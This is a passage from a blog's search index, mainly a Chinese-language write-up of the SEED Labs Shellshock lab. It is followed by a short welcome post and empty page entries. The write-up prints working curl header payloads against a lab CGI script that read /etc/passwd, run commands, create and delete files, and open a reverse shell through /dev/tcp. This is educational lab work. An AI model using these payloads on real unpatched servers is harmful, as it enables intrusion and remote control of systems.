class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器返回内容</span></div>    <div class="hide-content"><p>****** Environment Variables ******<br>HTTP_HOST=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0<br>HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5<br>HTTP_ACCEPT_ENCODING=gzip, deflate<br>HTTP_CONNECTION=keep-alive<br>HTTP_UPGRADE_INSECURE_REQUESTS=1<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>SERVER_SIGNATURE=<address>Apache/2.4.41 (Ubuntu) Server at <a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a> Port 80</address><br>SERVER_SOFTWARE=Apache/2.4.41 (Ubuntu)<br>SERVER_NAME=<a href="http://www.seedlab-shellshock.com/">www.seedlab-shellshock.com</a><br>SERVER_ADDR=10.9.0.80<br>SERVER_PORT=80<br>REMOTE_ADDR=10.9.0.1<br>DOCUMENT_ROOT=/var/www/html<br>REQUEST_SCHEME=http<br>CONTEXT_PREFIX=/cgi-bin/<br>CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/<br>SERVER_ADMIN=webmaster@localhost<br>SCRIPT_FILENAME=/usr/lib/cgi-bin/getenv.cgi<br>REMOTE_PORT=45228<br>GATEWAY_INTERFACE=CGI/1.1<br>SERVER_PROTOCOL=HTTP/1.1<br>REQUEST_METHOD=GET<br>QUERY_STRING=<br>REQUEST_URI=/cgi-bin/getenv.cgi<br>SCRIPT_NAME=/cgi-bin/getenv.cgi</p></div></div><div class="hide-toggle" ><div class="hide-button toggle-title" style=""><i class="fas fa-caret-right fa-fw"></i><span>浏览器可传入的环境变量</span></div>    <div class="hide-content"><ul><li>HTTP_USER_AGENT</li><li>HTTP_ACCEPT</li><li>HTTP_ACCEPT_LANGUAGE</li><li>HTTP_ACCEPT_ENCODING</li><li>HTTP_HOST</li><li>HTTP_CONNECTION</li><li>HTTP_UPGRADE_INSECURE_REQUESTS</li></ul></div></div><h3 id="使用curl"><a href="#使用curl" class="headerlink" title="使用curl"></a>使用curl</h3><ul><li><code>-A</code>改变User-Agent字段</li><li><code>-e</code>改变Referer字段</li><li><code>-H</code>自定义头部，无值<code>Extra-Header;</code>,有值<code>Extra-Header: value</code><br>上面的三个选项均可以用来向环境变量中注入数据。<h2 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h2>目标URL：<a href="http://www.seedlab-shellshock.com/cgi-bin/vul.cgi">http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</a><br>如果攻击命令执行结果是一个纯文本输出，并且我们想要该结果返回，则需要满足该协议：首先要以<code>echo &quot;Content-type: text/plain&quot;;</code>开头，后面跟随着一个空白行<code>echo;</code>，最后是我们想要执行的指令。<br>比如：<code>echo &quot;Content-type: text/plain&quot;;echo;/bin/ls -l</code><h3 id="服务器返回-etc-passwd的内容"><a href="#服务器返回-etc-passwd的内容" class="headerlink" title="服务器返回/etc/passwd的内容"></a>服务器返回/etc/passwd的内容</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/cat /etc/passwd&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="服务器返回当前的User-ID"><a href="#服务器返回当前的User-ID" class="headerlink" title="服务器返回当前的User ID"></a>服务器返回当前的User ID</h3>使用-H选项来进行攻击<br><code>curl -v -H &#39;shArp: () &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/id&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi </code><h3 id="在-tmp目录下创建新的文件"><a href="#在-tmp目录下创建新的文件" class="headerlink" title="在/tmp目录下创建新的文件"></a>在/tmp目录下创建新的文件</h3>使用-A选项<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/touch /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>查看创建的文件：<br><code>curl -v -A &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/ls /tmp -l&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></li></ul><mark class="hl-label red">注意：</mark> 一次只能执行一个命令<h3 id="删除创建的文件"><a href="#删除创建的文件" class="headerlink" title="删除创建的文件"></a>删除创建的文件</h3><p>使用-e选项<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/rm /tmp/sharp&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><h3 id="问题回答"><a href="#问题回答" class="headerlink" title="问题回答"></a>问题回答</h3><p>1.不能读取/ect/shadow文件，因为只有root用户以及处于shadow用户组的用户才有读取权限<br>2.不可以（对于我来说）通过在GET请求的数据部分插入代码，这是因为<code>?</code>后面只能跟连续的字符串。curl中?后面加上空格会显示<strong>bad request</strong>,而进行一些编码等处理后会原封不动的赋值给环境变量，从而无法成功的进行解析。</p><h2 id="通过Shellshock创建反向shell"><a href="#通过Shellshock创建反向shell" class="headerlink" title="通过Shellshock创建反向shell"></a>通过Shellshock创建反向shell</h2><p>在发现服务器存在任意命令执行漏洞后，为了我们进一步的攻击往往需要创建一个交互式的shell。反向shell的原理在这里就不在说明。<br><code>curl -v -e &#39;() &#123; echo &quot;hello&quot;; &#125;; echo &quot;Content-type: text/plain&quot;; echo; /bin/bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1 2&gt;&amp;1&#39; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code><br>最终成功的反弹了一个shell<br><img src="https://s2.loli.net/2022/01/23/HgPU8qkNlaI3KA9.png" alt="image.png"><br>作者在这里是直接反弹到了本地虚拟机的ens33端口，由于docker的网络配置其他IP地址可能不会成功反弹shell。</p><h2 id="使用打过补丁的Bash"><a href="#使用打过补丁的Bash" class="headerlink" title="使用打过补丁的Bash"></a>使用打过补丁的Bash</h2><p>修复之后的Bash会直接将函数后面的内容忽略掉，所以不会成功的执行上面命令。具体操作不再展示。</p><h2 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h2><p>对于Linux操作系统来说任何对象均为文件，建立的TCP连接也是一样的，不同编程语言版本的反向shell都是将标准输入、输出的文件描述符重定向到TCP连接的文件描述符从而实现远程控制。</p><h1 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h1><h2 id="curl发送的编码问题"><a href="#curl发送的编码问题" class="headerlink" title="curl发送的编码问题"></a>curl发送的编码问题</h2><p>在GET请求的数据部分发送POC时大括号会消失:<br>原请求<code>curl -v &#39;http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?()+&#123;+echo+&quot;hello&quot;;+&#125;;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l&#39;</code><br>返回的内容<code>QUERY_STRING=()++echo+&quot;hello&quot;;+;+echo+&quot;Content-type:+text/plain&quot;;+echo;/bin/ls+/etc/shadow+-l</code><br>需要使用转义符号<code>\</code>进行转义。<br>GET请求中的一些特殊字符比如空格等，需要进行编码之后进行发送。<br>POST请求如果带有特殊字符可以使用<code>--data-urlencode</code>进行编码或者使用转义字符。</p>]]></content>
      
      
      <categories>
          
          <category> 国外课程 </category>
          
          <category> seedlab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CGI </tag>
            
            <tag> CVE </tag>
            
            <tag> bash </tag>
            
            <tag> curl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello</title>
      <link href="/2022/01/22/Hello/"/>
      <url>/2022/01/22/Hello/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>互联网上的小伙伴们，大家好！<br>这是我的第一个博客，在这里会记录我的学习过程。<br>希望里面的文章会对你有所帮助!</p><div class="note success modern"><p>Keep Learning!</p></div>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>books</title>
      <link href="/books/index.html"/>
      <url>/books/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>movies</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>music</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
